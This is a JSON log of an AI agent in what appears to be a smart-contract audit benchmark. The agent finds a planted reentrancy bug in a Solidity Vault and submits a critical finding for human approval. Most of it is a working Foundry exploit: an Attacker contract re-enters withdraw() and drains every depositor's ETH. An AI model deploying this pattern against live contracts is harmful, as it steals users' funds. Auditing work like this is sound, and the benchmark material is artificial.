{"t":1794283161148,"ev":"settled","status":"done","summary":{"calls":[{"name":"list_sources","args":{}},{"name":"read_source","args":{"file":"Vault.sol"}},{"name":"run_poc","args":{"test_source":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\nimport {Test, console} from \"forge-std/Test.sol\";\nimport {Vault} from \"../src/Vault.sol\";\n\n/// Attacker contract: re-enters withdraw() from its receive() hook.\ncontract Attacker {\n    Vault public vault;\n    uint256 public unit;\n\n    constructor(Vault _vault, uint256 _unit) {\n        vault = _vault;\n        unit = _unit;\n    }\n\n    receive() external payable {\n        // Re-enter while our balanceOf is still non-zero.\n        if (address(vault).balance >= unit) {\n            vault.withdraw();\n        }\n    }\n\n    function attack() external {\n        vault.deposit{value: unit}();\n        vault.withdraw();\n    }\n}\n\ncontract VaultReentrancyTest is Test {\n    Vault vault;\n    Attacker attacker;\n    address victim = address(0xBEEF);\n\n    function setUp() public {\n        vault = new Vault();\n        attacker = new Attacker(vault, 1 ether);\n\n        vm.deal(address(attacker), 1 ether);\n        vm.deal(victim, 3 ether);\n\n        // An honest user deposits 3 ETH first.\n        vm.prank(victim);\n        vault.deposit{value: 3 ether}();\n    }\n\n    function testReentrancyDrainsVault() public {\n        assertEq(address(vault).balance, 3 ether);\n        assertEq(address(attacker).balance, 1 ether);\n\n        attacker.attack();\n\n        console.log(\"vault balance after attack  :\", address(vault).balance);\n        console.log(\"attacker balance after attack:\", address(attacker).balance);\n        console.log(\"victim  balanceOf (stale)    :\", vault.balanceOf(victim));\n\n        // Attacker put in 1 ETH and walked out with all 4 ETH.\n        assertEq(address(attacker).balance, 4 ether);\n        assertEq(address(vault).balance, 0);\n        assertGt(address(attacker).balance, 1 ether);\n\n        // Victim is now stuck: still \"owns\" 3 ETH but the vault is empty.\n        assertEq(vault.balanceOf(victim), 3 ether);\n    }\n}\n","contract_name":"VaultReentrancyTest"}},{"name":"submit_finding","args":{"title":"Reentrancy in Vault.withdraw() lets an attacker drain the whole vault","severity":"critical","poc_contract":"VaultReentrancyTest","explanation":"## What goes wrong\n\n`Vault` is a bank for ETH. You call `deposit()` to put ETH in, and `withdraw()` to take your own ETH out. The contract keeps a scoreboard, `balanceOf`, that says how much each address owns.\n\n`withdraw()` has its steps in the wrong order:\n\n```solidity\nuint256 amount = balanceOf[msg.sender];\nrequire(amount > 0, \"nothing to withdraw\");\n\n// BUG: external call happens before state update.\n(bool ok, ) = msg.sender.call{value: amount}(\"\");\nrequire(ok, \"transfer failed\");\n\nbalanceOf[msg.sender] = 0; // too late: re-entered before this runs\n```\n\n1. It reads your score from `balanceOf`.\n2. It sends you the ETH.\n3. Only then does it set your score to `0`.\n\nStep 2 hands control to the caller *before* step 3 runs. If the caller is a contract, its `receive()` function runs at that moment. Its score on the scoreboard is still the old, non-zero number. So it can call `withdraw()` again, and the contract sends the money again. This loop repeats until the vault is empty.\n\n## Why the contract allows it\n\nThere is no lock that stops a second `withdraw()` from starting while the first one is still running. There is also no state change before the ETH leaves. Security people call this \"checks-effects-interactions\" being broken: the \"effects\" (updating the scoreboard) must come before the \"interactions\" (sending ETH).\n\n## The attack, step by step\n\nAn honest user `victim` deposits 3 ETH. The attacker deploys a contract and deposits 1 ETH. The vault now holds 4 ETH.\n\nThe attack contract calls `attack()`:\n\n```solidity\nfunction attack() external {\n    vault.deposit{value: unit}();\n    vault.withdraw();\n}\n\nreceive() external payable {\n    // Re-enter while our balanceOf is still non-zero.\n    if (address(vault).balance >= unit) {\n        vault.withdraw();\n    }\n}\n```\n\n`withdraw()` sends 1 ETH, then the attacker's `receive()` fires. The vault balance is still 3 ETH, so `receive()` calls `withdraw()` again. That sends another 1 ETH, fires `receive()` again, and so on. Each call sends the same 1 ETH because the score is still 1 ETH.\n\nThe attacker's score is zeroed only as each frame finally finishes. By then it has already been paid many times.\n\n## What the attacker gains\n\nFrom the passing test:\n\n```\nvault balance after attack  : 0\nattacker balance after attack: 4000000000000000000\nvictim  balanceOf (stale)    : 3000000000000000000\n```\n\nThe attacker risked 1 ETH and left with 4 ETH. The vault is empty. The victim still shows 3 ETH on the scoreboard, but there is no ETH left to pay them. So the victim loses everything.\n\nThe proof is in `testReentrancyDrainsVault()`, which asserts the attacker's balance goes from 1 ETH to 4 ETH and the vault balance hits zero.\n\nFix: set `balanceOf[msg.sender] = 0;` before the low-level `msg.sender.call{value: amount}(\"\")`, or add a `nonReentrant` guard.\n"}}],"results":[{"name":"list_sources","isError":false,"text":"Vault.sol"},{"name":"read_source","isError":false,"text":"// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n/// @title Vault\n/// @notice A simple ETH vault. Users deposit and withdraw their own balance.\n/// @dev PLANTED BUG (reentrancy): withdraw() sends ETH with a low-level call\n///      BEFORE it zeroes the caller's balance. A malicious contract "},{"name":"run_poc","isError":false,"text":"Compiling 25 files with Solc 0.8.38\nSolc 0.8.38 finished in 244.73ms\nCompiler run successful with warnings:\n\nRan 1 test for test/AgentPoc.t.sol:VaultReentrancyTest\n[PASS] testReentrancyDrainsVault() (gas: 142393)\nLogs:\n  vault balance after attack  : 0\n  attacker balance after attack: 40000000000000"},{"name":"submit_finding","isError":false,"text":"Finding recorded: Reentrancy in Vault.withdraw() lets an attacker drain the whole vault (critical)."}],"assistants":[{"stop":"toolUse","text":"I'll start by listing the sources available under `src/`.\n\n","toolCalls":1},{"stop":"toolUse","text":"","toolCalls":1},{"stop":"toolUse","text":"The contract has a textbook checks-effects-interactions violation: `withdraw()` sends ETH before zeroing `balanceOf[msg.sender]`. Let me write a reentrancy PoC.\n\n","toolCalls":1},{"stop":"toolUse","text":"The PoC passes: the attacker turned 1 ETH into 4 ETH and left the vault empty. Submitting the finding.\n\n","toolCalls":1},{"stop":"stop","text":"## Summary\n\n**Vulnerability found:** a classic reentrancy bug in `Vault.withdraw()`.\n\nThe function sends ETH to `msg.sender` with a low-level `call` **before** it sets `balanceOf[msg.sender] = 0`. The attacker's `receive()` hook fires while the balance is still non-zero, so it calls `withdraw()` again — repeatedly, until the vault is empty.\n\n**Proof (passing test `VaultReentrancyTest`):**\n- Victim deposits 3 ETH, attacker deposits 1 ETH.\n- Attacker calls `attack()`, which re-enters `withdraw()` four times.\n- Result: vault balance `0`, attacker balance `4 ETH` from a 1 ETH stake, victim's 3 ETH stranded on the scoreboard.\n\n```\n[PASS] testReentrancyDrainsVault() (gas: 142393)\n  vault balance after attack  : 0\n  attacker balance after attack: 4000000000000000000\n  victim  balanceOf (stale)    : 3000000000000000000\n```\n\n**Fix:** move `balanceOf[msg.sender] = 0;` above the external call (checks-effects-interactions), or add a reentrancy guard.\n\nThe finding has been submitted as `critical` and awaits human approval.","toolCalls":0}],"final":{"stop":"stop","text":"## Summary\n\n**Vulnerability found:** a classic reentrancy bug in `Vault.withdraw()`.\n\nThe function sends ETH to `msg.sender` with a low-level `call` **before** it sets `balanceOf[msg.sender] = 0`. The attacker's `receive()` hook fires while the balance is still non-zero, so it calls `withdraw()` again — repeatedly, until the vault is empty.\n\n**Proof (passing test `VaultReentrancyTest`):**\n- Victim deposits 3 ETH, attacker deposits 1 ETH.\n- Attacker calls `attack()`, which re-enters `withdraw()` four times.\n- Result: vault balance `0`, attacker balance `4 ETH` from a 1 ETH stake, victim's 3 ETH stranded on the scoreboard.\n\n```\n[PASS] testReentrancyDrainsVault() (gas: 142393)\n  vault balance after attack  : 0\n  attacker balance after attack: 4000000000000000000\n  victim  balanceOf (stale)    : 3000000000000000000\n```\n\n**Fix:** move `balanceOf[msg.sender] = 0;` above the external call (checks-effects-interactions), or add a reentrancy guard.\n\nThe finding has been submitted as `critical` and awaits human approval.","toolCalls":0}},"pendingIds":["50561f4b-7035-4568-99c8-c4cd97025eea"],"usage":{"usd":0.00297552,"models":{"boundless/deepseek-v4.1-flash-abliterated":{"in":198,"out":3050,"reasoning":1200}}},"reports":[]}
